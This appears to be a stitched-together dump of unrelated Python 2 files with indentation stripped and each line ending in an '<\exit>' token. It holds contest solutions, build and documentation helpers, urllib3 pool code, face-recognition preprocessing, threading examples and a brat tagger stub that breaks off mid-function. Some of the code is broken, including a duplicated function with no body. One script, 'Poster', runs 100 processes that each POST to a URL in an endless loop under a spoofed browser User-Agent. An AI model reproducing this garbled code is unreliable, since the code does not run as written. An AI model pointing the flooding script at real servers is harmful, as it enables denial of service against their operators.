k %= math.factorial(n)<\exit>
ret = []<\exit>
for i in xrange(n-1, -1, -1):<\exit>
idx, k = divmod(k, math.factorial(i))<\exit>
ret.append(array.pop(idx))<\exit>
return "".join(map(str, ret))<\exit>
MOD = 1000000007<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, A = cipher<\exit>
cnts = [0 for _ in xrange(N + 1)]<\exit>
for num in A:<\exit>
cnts[num] += 1<\exit>
if 0 not in cnts:<\exit>
return 0<\exit>
result = 1<\exit>
paths = cnts[0]<\exit>
for i in xrange(1, N):<\exit>
if paths <= 0:<\exit>
return 0<\exit>
result *= paths<\exit>
result %= MOD<\exit>
paths += cnts[i]<\exit>
paths -= 1<\exit>
return result<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import pickle<\exit>
import os<\exit>
import codecs<\exit>
def dump_pickles(out, dirname, filename, path):<\exit>
f = open(os.path.join(dirname, filename), 'r')<\exit>
data = pickle.load(f)<\exit>
fragment_file = codecs.open(data['current_page_name'] + '.frag', mode='w', encoding='utf-8')<\exit>
fragment_file.write(data['body'])<\exit>
fragment_file.close()<\exit>
out.write('  <page url="%s">\n' % path)<\exit>
out.write('    <fragment>%s.frag</fragment>\n' % data['current_page_name'])<\exit>
if data['prev'] is not None:<\exit>
out.write('    <prev url="%s">%s</prev>\n' %<\exit>
(os.path.normpath(os.path.join(path, data['prev']['link'])),<\exit>
data['prev']['title']))<\exit>
if data['next'] is not None:<\exit>
out.write('    <next url="%s">%s</next>\n' %<\exit>
(os.path.normpath(os.path.join(path, data['next']['link'])),<\exit>
data['next']['title']))<\exit>
out.write('  </page>\n')<\exit>
f.close()<\exit>
if data['next'] is not None:<\exit>
next_path = os.path.normpath(os.path.join(path, data['next']['link']))<\exit>
next_filename = os.path.basename(next_path) + '.fpickle'<\exit>
dump_pickles(out, dirname, next_filename, next_path)<\exit>
return<\exit>
import sys<\exit>
sys.stdout.write('<pages>\n')<\exit>
dump_pickles(sys.stdout, os.path.dirname(sys.argv[1]), os.path.basename(sys.argv[1]), '/')<\exit>
sys.stdout.write('</pages>')<\exit>
import Options<\exit>
import Configure<\exit>
import subprocess<\exit>
import config_c<\exit>
import sys<\exit>
def configure(conf):<\exit>
pkg_config = conf.find_program('pkg-config', var='PKG_CONFIG')<\exit>
if not pkg_config: return<\exit>
@Configure.conf<\exit>
def pkg_check_modules(conf, uselib_name, expression, mandatory=True):<\exit>
pkg_config = conf.env['PKG_CONFIG']<\exit>
if not pkg_config:<\exit>
if mandatory:<\exit>
conf.fatal("pkg-config is not available")<\exit>
else:<\exit>
return False<\exit>
if Options.options.verbose:<\exit>
extra_msg = ' (%s)' % expression<\exit>
else:<\exit>
extra_msg = ''<\exit>
conf.start_msg('Checking for pkg-config flags for %s%s' % (uselib_name, extra_msg))<\exit>
argv = [pkg_config, '--cflags', '--libs', expression]<\exit>
cmd = subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<\exit>
out, err = cmd.communicate()<\exit>
retval = cmd.wait()<\exit>
conf.to_log('%r: %r (exit code %i)\n%s' % (argv, out, retval, err))<\exit>
if retval != 0:<\exit>
conf.end_msg(False)<\exit>
sys.stderr.write(err)<\exit>
else:<\exit>
if Options.options.verbose:<\exit>
conf.end_msg(out)<\exit>
else:<\exit>
conf.end_msg(True)<\exit>
if retval == 0:<\exit>
conf.parse_flags(out, uselib_name, conf.env)<\exit>
conf.env[uselib_name] = True<\exit>
return True<\exit>
else:<\exit>
conf.env[uselib_name] = False<\exit>
if mandatory:<\exit>
raise Configure.ConfigurationError('pkg-config check failed')<\exit>
else:<\exit>
return False<\exit>
@Configure.conf<\exit>
def pkg_check_module_variable(conf, module, variable):<\exit>
pkg_config = conf.env['PKG_CONFIG']<\exit>
if not pkg_config:<\exit>
conf.fatal("pkg-config is not available")<\exit>
argv = [pkg_config, '--variable', variable, module]<\exit>
cmd = subprocess.Popen(argv, stdout=subprocess.PIPE)<\exit>
out, dummy = cmd.communicate()<\exit>
retval = cmd.wait()<\exit>
out = out.rstrip()<\exit>
msg_checking = ("Checking for pkg-config variable %r in %s" % (variable, module,))<\exit>
conf.check_message_custom(msg_checking, '', out)<\exit>
conf.log.write('%r: %r (exit code %i)\n' % (argv, out, retval))<\exit>
if retval == 0:<\exit>
return out<\exit>
else:<\exit>
raise Configure.ConfigurationError('pkg-config check failed')<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, v = cipher<\exit>
v.reverse()<\exit>
s = [0 for _ in xrange(N + 1)]<\exit>
for i in xrange(1, N + 1):<\exit>
s[i] = s[i - 1] + v[i - 1]<\exit>
f = [[0, 0] for _ in xrange(N + 1)]<\exit>
for i in xrange(1, N + 1):<\exit>
local_max = 0<\exit>
for k in xrange(1, 4):<\exit>
if i - k >= 0:<\exit>
local_max = max(local_max, s[i] - s[i - k] + s[i - k] - f[i - k][1])<\exit>
f[i][0] = local_max<\exit>
local_max = 0<\exit>
for k in xrange(1, 4):<\exit>
if i - k >= 0:<\exit>
local_max = max(local_max, s[i] - s[i - k] + s[i - k] - f[i - k][0])<\exit>
f[i][1] = local_max<\exit>
return f[-1][0]<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
lst = map(lambda x: int(x), f.readline().strip().split(" "))<\exit>
cipher = [N, lst]<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import matplotlib.pyplot as plt<\exit>
class Plotter(object):<\exit>
def plot(self, L_lst):<\exit>
plt.figure("Log_likelihood")<\exit>
plt.ylabel("L: Log-likelihood")<\exit>
plt.xlabel("N: number of iterations")<\exit>
plt.plot([i+1 for i in xrange(len(L_lst))], L_lst)<\exit>
plt.show()<\exit>
class Plotter2D(object):<\exit>
def label(self, name, x_label, y_label):<\exit>
plt.figure(name)<\exit>
plt.xlabel(x_label)<\exit>
plt.ylabel(y_label)<\exit>
def plot_line(self, x1, y1, x2, y2):<\exit>
plt.plot([x1, x2], [y1, y2])<\exit>
def plot_scatter(self, X, Y, color="b"):<\exit>
plt.scatter(X, Y, c=color)<\exit>
def show(self):<\exit>
plt.show()<\exit>
import math<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
cipher.sort(cmp=self.cmp)<\exit>
def cmp_polar(self, a, b):<\exit>
x1 = a[0]<\exit>
y1 = a[1]<\exit>
x2 = b[0]<\exit>
y2 = b[1]<\exit>
cross_product = x1 * y2 - x2 * y1<\exit>
if cross_product > 0:<\exit>
return -1<\exit>
elif cross_product < 0:<\exit>
return 1<\exit>
else:<\exit>
if x1 * x1 >= 0 and y1 * y1 >= 0:<\exit>
return x1 * x1 + y1 * y1 - x2 * x2 - y2 * y2<\exit>
else:<\exit>
if y1 > 0:<\exit>
return -1<\exit>
if y2 > 0:<\exit>
return 1<\exit>
if y1 == 0 and x1 > 0:<\exit>
return -1<\exit>
else:<\exit>
return 1<\exit>
def cmp(self, a, b):<\exit>
x1 = a[0]<\exit>
y1 = a[1]<\exit>
x2 = b[0]<\exit>
y2 = b[1]<\exit>
r1 = x1 * x1 + y1 * y1<\exit>
r2 = x2 * x2 + y2 * y2<\exit>
phi1 = math.atan2(y1, x1)<\exit>
phi2 = math.atan2(y2, x2)<\exit>
if phi1 < 0:<\exit>
phi1 += math.pi * 2<\exit>
if phi2 < 0:<\exit>
phi2 += math.pi * 2<\exit>
if phi1 < phi2:<\exit>
return -1<\exit>
elif phi1 > phi2:<\exit>
return 1<\exit>
else:<\exit>
return r1 - r2<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N = int(f.readline().strip())<\exit>
cipher = []<\exit>
for t in xrange(N):<\exit>
cipher.append(map(int, f.readline().strip().split(' ')))<\exit>
Solution().solve(cipher)<\exit>
for point in cipher:<\exit>
print "%d %d" % (point[0], point[1])<\exit>
import logging<\exit>
from ._collections import RecentlyUsedContainer<\exit>
from .connectionpool import HTTPConnectionPool, HTTPSConnectionPool<\exit>
from .connectionpool import connection_from_url, port_by_scheme<\exit>
from .request import RequestMethods<\exit>
from .util import parse_url<\exit>
__all__ = ['PoolManager', 'ProxyManager', 'proxy_from_url']<\exit>
pool_classes_by_scheme = {<\exit>
'http': HTTPConnectionPool,<\exit>
'https': HTTPSConnectionPool,<\exit>
}<\exit>
log = logging.getLogger(__name__)<\exit>
class PoolManager(RequestMethods):<\exit>
def __init__(self, num_pools=10, headers=None, **connection_pool_kw):<\exit>
RequestMethods.__init__(self, headers)<\exit>
self.connection_pool_kw = connection_pool_kw<\exit>
self.pools = RecentlyUsedContainer(num_pools,<\exit>
dispose_func=lambda p: p.close())<\exit>
def clear(self):<\exit>
self.pools.clear()<\exit>
def connection_from_host(self, host, port=None, scheme='http'):<\exit>
port = port or port_by_scheme.get(scheme, 80)<\exit>
pool_key = (scheme, host, port)<\exit>
pool = self.pools.get(pool_key)<\exit>
if pool:<\exit>
return pool<\exit>
pool_cls = pool_classes_by_scheme[scheme]<\exit>
pool = pool_cls(host, port, **self.connection_pool_kw)<\exit>
self.pools[pool_key] = pool<\exit>
return pool<\exit>
def connection_from_url(self, url):<\exit>
u = parse_url(url)<\exit>
return self.connection_from_host(u.host, port=u.port, scheme=u.scheme)<\exit>
def urlopen(self, method, url, redirect=True, **kw):<\exit>
u = parse_url(url)<\exit>
conn = self.connection_from_host(u.host, port=u.port, scheme=u.scheme)<\exit>
kw['assert_same_host'] = False<\exit>
kw['redirect'] = False<\exit>
if 'headers' not in kw:<\exit>
kw['headers'] = self.headers<\exit>
response = conn.urlopen(method, u.request_uri, **kw)<\exit>
redirect_location = redirect and response.get_redirect_location()<\exit>
if not redirect_location:<\exit>
return response<\exit>
if response.status == 303:<\exit>
method = 'GET'<\exit>
log.info("Redirecting %s -> %s" % (url, redirect_location))<\exit>
kw['retries'] = kw.get('retries', 3) - 1<\exit>
return self.urlopen(method, redirect_location, **kw)<\exit>
class ProxyManager(RequestMethods):<\exit>
def __init__(self, proxy_pool):<\exit>
self.proxy_pool = proxy_pool<\exit>
def _set_proxy_headers(self, headers=None):<\exit>
headers_ = {'Accept': '*/*'}<\exit>
if headers:<\exit>
headers_.update(headers)<\exit>
return headers_<\exit>
def urlopen(self, method, url, **kw):<\exit>
"Same as HTTP(S)ConnectionPool.urlopen, ``url`` must be absolute."<\exit>
kw['assert_same_host'] = False<\exit>
kw['headers'] = self._set_proxy_headers(kw.get('headers'))<\exit>
return self.proxy_pool.urlopen(method, url, **kw)<\exit>
def proxy_from_url(url, **pool_kw):<\exit>
proxy_pool = connection_from_url(url, **pool_kw)<\exit>
return ProxyManager(proxy_pool)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
a, b, x, y = cipher<\exit>
if self.gcd(a, b) == self.gcd(x, y):<\exit>
return "YES"<\exit>
else:<\exit>
return "NO"<\exit>
def gcd(self, a, b):<\exit>
while b:<\exit>
a, b = b, a % b<\exit>
return a<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution:<\exit>
def postOffice_TLE(self, A, K):<\exit>
A.sort()<\exit>
N = len(A)<\exit>
F = [[0 for _ in xrange(K+1)] for _ in xrange(N+1)]<\exit>
c = [[0 for _ in xrange(N+1)] for _ in xrange(N+1)]<\exit>
for i in xrange(N):<\exit>
for j in xrange(i+1, N+1):<\exit>
m = (i+j)/2<\exit>
for l in xrange(i, j):<\exit>
c[i][j] += abs(A[m]-A[l])<\exit>
for n in xrange(1, N+1):<\exit>
F[n][1] = c[0][n]<\exit>
for n in xrange(1, N+1):<\exit>
for k in xrange(2, K+1):<\exit>
F[n][k] = min(<\exit>
F[l][k-1]+c[l][n] for l in xrange(n)<\exit>
)<\exit>
return F[N][K]<\exit>
def postOffice_TLE(self, A, K):<\exit>
if __name__ == "__main__":<\exit>
assert Solution().postOffice([112,122,360,311,85,225,405,53,405,43,342,13,588,424,299,37,104,289,404,414], 3) == 673<\exit>
from multiprocessing import Process<\exit>
import requests<\exit>
from docopt import docopt<\exit>
N = 100<\exit>
class Poster(Process):<\exit>
def __init__(self, url, data=None):<\exit>
self.client = requests.session()<\exit>
self.common_headers = {<\exit>
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",<\exit>
"Accept-Encoding": "gzip,deflate,sdch",<\exit>
"Accept-Language": "en-US,en;q=0.8,zh;q=0.6,zh-CN;q=0.4",<\exit>
"Cache-Control": "max-age=0",<\exit>
"Content-Type": "application/json",<\exit>
"Connection": "keep-alive",<\exit>
"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36"<\exit>
}<\exit>
self.url = url<\exit>
self.data = data<\exit>
super(Poster, self).__init__()<\exit>
def post(self):<\exit>
response = self.client.post(self.url, json=self.data,<\exit>
headers=self.common_headers)<\exit>
return response<\exit>
def run(self):<\exit>
while True:<\exit>
response = self.post()<\exit>
print response.text<\exit>
if __name__ == "__main__":<\exit>
options = docopt(__doc__, version='poster 0.0.1')<\exit>
url = options['<url>']<\exit>
data = options['<post_data>']<\exit>
n = N<\exit>
if options['--num_process']:<\exit>
n = int(options['<num>'])<\exit>
print "running with number of processes: %d" % n<\exit>
for i in xrange(n):<\exit>
Poster(url, data).start()<\exit>
import numpy as np<\exit>
from facerec_py.facerec.feature import AbstractFeature<\exit>
from facerec_py.facerec.util import asColumnMatrix<\exit>
from scipy import ndimage<\exit>
from scipy.misc import imresize<\exit>
class Resize(AbstractFeature):<\exit>
def __init__(self, size):<\exit>
AbstractFeature.__init__(self)<\exit>
self._size = size<\exit>
def compute(self, X, y):<\exit>
Xp = []<\exit>
for xi in X:<\exit>
Xp.append(self.extract(xi))<\exit>
return Xp<\exit>
def extract(self, X):<\exit>
return imresize(X, self._size)<\exit>
def __repr__(self):<\exit>
return "Resize (size=%s)" % (self._size,)<\exit>
class HistogramEqualization(AbstractFeature):<\exit>
def __init__(self, num_bins=256):<\exit>
AbstractFeature.__init__(self)<\exit>
self._num_bins = num_bins<\exit>
def compute(self, X, y):<\exit>
Xp = []<\exit>
for xi in X:<\exit>
Xp.append(self.extract(xi))<\exit>
return Xp<\exit>
def extract(self, X):<\exit>
h, b = np.histogram(X.flatten(), self._num_bins, normed=True)<\exit>
cdf = h.cumsum()<\exit>
cdf = 255 * cdf / cdf[-1]<\exit>
return np.interp(X.flatten(), b[:-1], cdf).reshape(X.shape)<\exit>
def __repr__(self):<\exit>
return "HistogramEqualization (num_bins=%s)" % (self._num_bins)<\exit>
class TanTriggsPreprocessing(AbstractFeature):<\exit>
def __init__(self, alpha=0.1, tau=10.0, gamma=0.2, sigma0=1.0, sigma1=2.0):<\exit>
AbstractFeature.__init__(self)<\exit>
self._alpha = float(alpha)<\exit>
self._tau = float(tau)<\exit>
self._gamma = float(gamma)<\exit>
self._sigma0 = float(sigma0)<\exit>
self._sigma1 = float(sigma1)<\exit>
def compute(self, X, y):<\exit>
Xp = []<\exit>
for xi in X:<\exit>
Xp.append(self.extract(xi))<\exit>
return Xp<\exit>
def extract(self, X):<\exit>
X = np.array(X, dtype=np.float32)<\exit>
X = np.power(X, self._gamma)<\exit>
X = np.asarray(ndimage.gaussian_filter(X, self._sigma1) - ndimage.gaussian_filter(X, self._sigma0))<\exit>
X = X / np.power(np.mean(np.power(np.abs(X), self._alpha)), 1.0 / self._alpha)<\exit>
X = X / np.power(np.mean(np.power(np.minimum(np.abs(X), self._tau), self._alpha)), 1.0 / self._alpha)<\exit>
X = self._tau * np.tanh(X / self._tau)<\exit>
return X<\exit>
def __repr__(self):<\exit>
return "TanTriggsPreprocessing (alpha=%.3f,tau=%.3f,gamma=%.3f,sigma0=%.3f,sigma1=%.3f)" % (<\exit>
self._alpha, self._tau, self._gamma, self._sigma0, self._sigma1)<\exit>
from facerec_py.facerec.lbp import ExtendedLBP<\exit>
class LBPPreprocessing(AbstractFeature):<\exit>
def __init__(self, lbp_operator=ExtendedLBP(radius=1, neighbors=8)):<\exit>
AbstractFeature.__init__(self)<\exit>
self._lbp_operator = lbp_operator<\exit>
def compute(self, X, y):<\exit>
Xp = []<\exit>
for xi in X:<\exit>
Xp.append(self.extract(xi))<\exit>
return Xp<\exit>
def extract(self, X):<\exit>
return self._lbp_operator(X)<\exit>
def __repr__(self):<\exit>
return "LBPPreprocessing (lbp_operator=%s)" % (repr(self._lbp_operator))<\exit>
from facerec_py.facerec.normalization import zscore, minmax<\exit>
class MinMaxNormalizePreprocessing(AbstractFeature):<\exit>
def __init__(self, low=0, high=1):<\exit>
AbstractFeature.__init__(self)<\exit>
self._low = low<\exit>
self._high = high<\exit>
def compute(self, X, y):<\exit>
Xp = []<\exit>
XC = asColumnMatrix(X)<\exit>
self._min = np.min(XC)<\exit>
self._max = np.max(XC)<\exit>
for xi in X:<\exit>
Xp.append(self.extract(xi))<\exit>
return Xp<\exit>
def extract(self, X):<\exit>
return minmax(X, self._low, self._high, self._min, self._max)<\exit>
def __repr__(self):<\exit>
return "MinMaxNormalizePreprocessing (low=%s, high=%s)" % (self._low, self._high)<\exit>
class ZScoreNormalizePreprocessing(AbstractFeature):<\exit>
def __init__(self):<\exit>
AbstractFeature.__init__(self)<\exit>
self._mean = 0.0<\exit>
self._std = 1.0<\exit>
def compute(self, X, y):<\exit>
XC = asColumnMatrix(X)<\exit>
self._mean = XC.mean()<\exit>
self._std = XC.std()<\exit>
Xp = []<\exit>
for xi in X:<\exit>
Xp.append(self.extract(xi))<\exit>
return Xp<\exit>
def extract(self, X):<\exit>
return zscore(X, self._mean, self._std)<\exit>
def __repr__(self):<\exit>
return "ZScoreNormalizePreprocessing (mean=%s, std=%s)" % (self._mean, self._std)<\exit>
import sys, os<\exit>
sys.path.append("../..")<\exit>
from facerec.feature import Fisherfaces, PCA, SpatialHistogram, Identity<\exit>
from facerec.distance import EuclideanDistance, ChiSquareDistance<\exit>
from facerec.classifier import NearestNeighbor<\exit>
from facerec.model import PredictableModel<\exit>
from facerec.validation import KFoldCrossValidation<\exit>
from facerec.visual import subplot<\exit>
from facerec.util import minmax_normalize<\exit>
from facerec.serialization import save_model, load_model<\exit>
import numpy as np<\exit>
try:<\exit>
from PIL import Image<\exit>
except ImportError:<\exit>
import Image<\exit>
import matplotlib.cm as cm<\exit>
import logging<\exit>
import matplotlib.pyplot as plt<\exit>
import matplotlib.cm as cm<\exit>
from facerec.lbp import LPQ, ExtendedLBP<\exit>
class FileNameFilter:<\exit>
def __init__(self, name):<\exit>
self._name = name<\exit>
def __call__(self, filename):<\exit>
return True<\exit>
def __repr__(self):<\exit>
return "FileNameFilter (name=%s)" % (self._name)<\exit>
class YaleBaseFilter(FileNameFilter):<\exit>
def __init__(self, min_azimuth, max_azimuth, min_elevation, max_elevation):<\exit>
FileNameFilter.__init__(self, "Filter YaleFDB Subset1")<\exit>
self._min_azimuth = min_azimuth<\exit>
self._max_azimuth = max_azimuth<\exit>
self._min_elevation = min_elevation<\exit>
self._max_elevation = max_elevation<\exit>
def __call__(self, filename):<\exit>
filetype = filename[-4:]<\exit>
if filetype != ".pgm":<\exit>
return False<\exit>
if "Ambient" in filename:<\exit>
return False<\exit>
azimuth = int(filename[12:16])<\exit>
elevation = int(filename[17:20])<\exit>
if azimuth < self._min_azimuth or azimuth > self._max_azimuth:<\exit>
return False<\exit>
if elevation < self._min_elevation or elevation > self._max_elevation:<\exit>
return False<\exit>
return True<\exit>
def read_images(path, fileNameFilter=FileNameFilter("None"), sz=None):<\exit>
c = 0<\exit>
X,y = [], []<\exit>
for dirname, dirnames, filenames in os.walk(path):<\exit>
for subdirname in dirnames:<\exit>
subject_path = os.path.join(dirname, subdirname)<\exit>
for filename in os.listdir(subject_path):<\exit>
if fileNameFilter(filename):<\exit>
print filename<\exit>
try:<\exit>
im = Image.open(os.path.join(subject_path, filename))<\exit>
im = im.convert("L")<\exit>
if (sz is not None):<\exit>
im = im.resize(self.sz, Image.ANTIALIAS)<\exit>
X.append(np.asarray(im, dtype=np.uint8))<\exit>
y.append(c)<\exit>
except IOError, (errno, strerror):<\exit>
print "I/O error({0}): {1}".format(errno, strerror)<\exit>
except:<\exit>
print "Unexpected error:", sys.exc_info()[0]<\exit>
raise<\exit>
c = c+1<\exit>
return [X,y]<\exit>
if __name__ == "__main__":<\exit>
out_dir = None<\exit>
if len(sys.argv) < 2:<\exit>
print "USAGE: facerec_demo.py </path/to/images>"<\exit>
sys.exit()<\exit>
yale_filter = YaleBaseFilter(-25, 25, -25, 25)<\exit>
[X,y] = read_images(sys.argv[1], yale_filter)<\exit>
handler = logging.StreamHandler(sys.stdout)<\exit>
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')<\exit>
handler.setFormatter(formatter)<\exit>
logger = logging.getLogger("facerec")<\exit>
logger.addHandler(handler)<\exit>
logger.setLevel(logging.DEBUG)<\exit>
feature = PCA()<\exit>
classifier = NearestNeighbor(dist_metric=EuclideanDistance(), k=1)<\exit>
model = PredictableModel(feature=feature, classifier=classifier)<\exit>
model.compute(X, y)<\exit>
E = []<\exit>
for i in xrange(min(model.feature.eigenvectors.shape[1], 16)):<\exit>
e = model.feature.eigenvectors[:,i].reshape(X[0].shape)<\exit>
E.append(minmax_normalize(e,0,255, dtype=np.uint8))<\exit>
subplot(title="Fisherfaces", images=E, rows=4, cols=4, sptitle="Fisherface", colormap=cm.jet, filename="fisherfaces.png")<\exit>
cv = KFoldCrossValidation(model, k=10)<\exit>
cv.validate(X, y)<\exit>
cv.print_results()<\exit>
class Solution:<\exit>
def previousPermuation(self, num):<\exit>
n = len(num)<\exit>
partition = n-2<\exit>
while partition >= 0 and num[partition] <= num[partition+1]:<\exit>
partition -= 1<\exit>
if partition < 0:<\exit>
return num[::-1]<\exit>
change = n-1<\exit>
while change >= 0 and num[change] >= num[partition]:<\exit>
change -= 1<\exit>
num[partition], num[change] = num[change], num[partition]<\exit>
num[partition+1:] = reversed(num[partition+1:])<\exit>
return num<\exit>
if __name__ == "__main__":<\exit>
print Solution().previousPermuation([1, 3, 2, 3])<\exit>
class Solution(object):<\exit>
def numbersByRecursion(self, n):<\exit>
return self.rec(n)<\exit>
def rec(self, n):<\exit>
if n == 0:<\exit>
return []<\exit>
if n == 1:<\exit>
return [i+1 for i in xrange(9)]<\exit>
else:<\exit>
lst = self.rec(n-1)<\exit>
l = len(lst)<\exit>
cur = []<\exit>
prev = lst[-1]+1<\exit>
for i in xrange(prev-prev/10):<\exit>
for j in xrange(10):<\exit>
cur.append(lst[prev/10-1+i]*10+j)<\exit>
lst.extend(cur)<\exit>
return lst<\exit>
if __name__ == "__main__":<\exit>
print Solution().numbersByRecursion(2)<\exit>
assert Solution().numbersByRecursion(2) == [i+1 for i in xrange(99)]<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
A = sorted(cipher)<\exit>
cur = -5<\exit>
cnt = 0<\exit>
for a in A:<\exit>
if cur + 4 < a:<\exit>
cur = a<\exit>
cnt += 1<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
n = int(f.readline().strip())<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
from celery import Celery<\exit>
import consumer<\exit>
app_name = 'consumer'<\exit>
app = Celery(app_name, broker=consumer.redis_url)<\exit>
for i in range(100):<\exit>
a = 1<\exit>
b = 2<\exit>
consumer.consume.delay(a, b)<\exit>
from Queue import Queue<\exit>
from threading import Thread<\exit>
import time<\exit>
class SimpleProducerConsumer(object):<\exit>
def __init__(self):<\exit>
self.queue = Queue(1)<\exit>
def consumer(self):<\exit>
time.sleep(0.1)<\exit>
self.queue.get()<\exit>
print('Consumer got 1')<\exit>
self.queue.get()<\exit>
print('Consumer got 2')<\exit>
def run(self):<\exit>
thread = Thread(target=self.consumer)<\exit>
thread.start()<\exit>
self.queue.put(object())<\exit>
print('Producer put 1')<\exit>
self.queue.put(object())<\exit>
print('Producer put 2')<\exit>
thread.join()<\exit>
print('Producer done')<\exit>
def consumer_queue_join(self):<\exit>
time.sleep(0.1)<\exit>
self.queue.get()<\exit>
print('Consumer got 1')<\exit>
self.queue.get()<\exit>
print('Consumer got 2')<\exit>
self.queue.task_done()<\exit>
def run_queue_join(self):<\exit>
thread = Thread(target=self.consumer_queue_join())<\exit>
thread.start()<\exit>
self.queue.put(object())<\exit>
print('Producer put 1')<\exit>
self.queue.put(object())<\exit>
print('Producer put 2')<\exit>
self.queue.join()<\exit>
print('Producer done')<\exit>
class ClosableQueue(Queue):<\exit>
STOP = object()<\exit>
def close(self):<\exit>
self.put(self.STOP)<\exit>
def __iter__(self):<\exit>
while True:<\exit>
item = self.get()<\exit>
try:<\exit>
if item is self.STOP: return<\exit>
yield item<\exit>
finally:<\exit>
self.task_done()<\exit>
class StoppableWorker(Thread):<\exit>
def __init__(self, func, in_queue, out_queue):<\exit>
self.func = func<\exit>
self.in_queue = in_queue<\exit>
self.out_queue = out_queue<\exit>
def run(self):<\exit>
for item in self.in_queue:<\exit>
result = self.func(item)<\exit>
self.out_queue.put(result)<\exit>
@staticmethod<\exit>
def test():<\exit>
download_queue = ClosableQueue()<\exit>
resize_queue = ClosableQueue()<\exit>
upload_queue = ClosableQueue()<\exit>
done_queue = ClosableQueue()<\exit>
threads = [<\exit>
StoppableWorker(lambda x: x, download_queue, resize_queue),<\exit>
StoppableWorker(lambda x: x, resize_queue, upload_queue),<\exit>
StoppableWorker(lambda x: x, upload_queue, download_queue)<\exit>
]<\exit>
for thread in threads:<\exit>
thread.start()<\exit>
N = 1000<\exit>
for _ in xrange(N):<\exit>
download_queue.put(object())<\exit>
download_queue.close()<\exit>
download_queue.join()<\exit>
resize_queue.close()<\exit>
resize_queue.join()<\exit>
upload_queue.close()<\exit>
upload_queue.join()<\exit>
assert done_queue.qsize() == N<\exit>
class Solution:<\exit>
def productExcludeItself(self, A):<\exit>
n = len(A)<\exit>
if n == 1:<\exit>
return []<\exit>
dp = [[1, 1] for _ in xrange(n)]<\exit>
for i in xrange(1, n):<\exit>
dp[i][0] = A[i-1]*dp[i-1][0]<\exit>
dp[n-i-1][1] = A[n-i]*dp[n-i][1]<\exit>
B = [dp[i][0]*dp[i][1] for i in xrange(n)]<\exit>
return B<\exit>
if __name__=="__main__":<\exit>
assert Solution().productExcludeItself([1, 2, 3]) == [6, 3, 2]<\exit>
from cProfile import Profile<\exit>
from pstats import Stats<\exit>
def demo():<\exit>
f = lambda x: x<\exit>
profiler = Profile()<\exit>
profiler.runcall(f)<\exit>
stats = Stats(profiler)<\exit>
stats.strip_dirs()<\exit>
stats.sort_stats('cumulative')<\exit>
stats.print_stats()<\exit>
stats.print_callers()<\exit>
stats.print_callees()<\exit>
from argparse import ArgumentParser<\exit>
from cgi import FieldStorage<\exit>
try:<\exit>
from json import dumps<\exit>
except ImportError:<\exit>
from sys import path as sys_path<\exit>
from os.path import join as path_join<\exit>
from os.path import dirname<\exit>
sys_path.append(path_join(dirname(__file__), '../server/lib/ujson'))<\exit>
from ujson import dumps<\exit>
from random import choice, randint<\exit>
from sys import stderr<\exit>
from urlparse import urlparse<\exit>
try:<\exit>
from urlparse import parse_qs<\exit>
except ImportError:<\exit>
from cgi import parse_qs<\exit>
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler<\exit>
import json<\exit>
import urllib<\exit>
import urllib2<\exit>
import base64<\exit>
ARGPARSER = ArgumentParser(description='An example HTTP tagging service, '<\exit>
'tagging Confuse-a-Cat **AND** Dead-parrot mentions!')<\exit>
ARGPARSER.add_argument('-p', '--port', type=int, default=56789,<\exit>
help='port to run the HTTP service on (default: 56789)')<\exit>
def build_headers(email="", password=""):<\exit>
headers = {<\exit>
'Content-Type': 'application/json',<\exit>
'Accept': 'application/json',<\exit>
'Authorization': b'Basic ' + base64.b64encode(email + b':' + password),<\exit>
}<\exit>
return headers<\exit>
def build_data(text):<\exit>
return json.dumps({'text': text}).encode('utf-8')<\exit>
def convert_for_brat(pubdic_result, text):<\exit>
anns = {}<\exit>
for idx, entity in enumerate(pubdic_result):<\exit>
ann_id = 'T%d' % idx<\exit>
anns[ann_id] = {<\exit>
'type': entity['obj'],<\exit>
'offsets': ((entity['begin'], entity['end']), ),<\exit>
'texts': (text[entity['begin']:entity['end']], ),<\exit>
}<\exit>
return anns<\exit>
class RandomTaggerHandler(BaseHTTPRequestHandler):<\exit>
def do_POST(self):<\exit>
field_storage = FieldStorage(<\exit>
headers=self.headers,<\exit>
environ={<\exit>
'REQUEST_METHOD':'POST',<\exit>
'CONTENT_TYPE':self.headers['Content-type'],<\exit>
},<\exit>
fp=self.rfile)<\exit>
try:<\exit>
headers = build_headers("", "")<\exit>
text    = field_storage.value.decode('utf-8')<\exit>
data    = build_data(text)<\exit>
